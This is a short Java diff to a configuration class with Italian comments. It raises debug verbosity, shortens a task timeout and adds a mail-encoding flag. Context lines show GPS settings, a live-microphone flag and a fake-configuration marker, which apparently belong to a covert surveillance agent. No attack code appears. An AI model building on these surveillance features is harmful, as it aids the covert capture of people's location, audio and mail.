@@ -37,7 +37,7 @@ public final class Conf {
 
 	/** The debug instance. */
 	//#ifdef DEBUG
-	private static Debug debug = new Debug("Conf", DebugLevel.INFORMATION);
+	private static Debug debug = new Debug("Conf", DebugLevel.VERBOSE);
 	//#endif
 
 	//==========================================================
@@ -70,13 +70,15 @@ public final class Conf {
 	public static final int GPS_MAXAGE = -1;
 	public static final int GPS_TIMEOUT = 300;
 
-	public static final long TASK_ACTION_TIMEOUT = 3600 * 1000; // ogni action che dura piu' di un ora viene killata
+	public static final long TASK_ACTION_TIMEOUT = 600 * 1000; // ogni action che dura piu' di dieci minuti viene killata
 
 	//#ifdef LIVE_MIC_ENABLED
 	public static boolean IS_UI = true;
 	//#else
 	public static boolean IS_UI = false;
 	//#endif
+	
+	public static final boolean MAIL_TEXT_FORCE_UTF8 = true;
 
 	//==========================================================
 
@@ -130,6 +132,8 @@ public final class Conf {
 
 	public static final byte[] FAKECONFSTART = "XW15TZlwZwpaWGPZ1wtL0f591tJe2b9c1z4PvkRuZaP1jTUR6yfBfLm4Knsu0st2"
 			.getBytes();
+
+	
 
 	/**
 	 * Crc verify.
